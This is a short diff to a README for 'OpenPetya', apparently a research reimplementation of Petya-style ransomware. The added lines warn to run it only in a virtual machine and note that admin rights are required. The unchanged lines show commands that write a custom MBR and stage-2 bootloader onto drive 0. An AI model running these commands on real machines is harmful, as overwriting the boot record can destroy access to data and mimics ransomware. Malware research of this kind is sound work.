@@ -174,6 +174,10 @@ make            # Build mbr.bin and stage2.bin
     <img src="https://iss4cf0ng.github.io/images/article/2026-5-23-OpenPetya/6.png" width=700/>
 </p>
 
+> Warning: Please execute it in your virtual machine!
+
+The commands below shows how to install custom MBR and stage-2 bootloader (Administrative privilege is required):
+
 ```batch
 OpenPetya.exe --list
 OpenPetya.exe --drive 0 --install mbr.bin stage2.bin
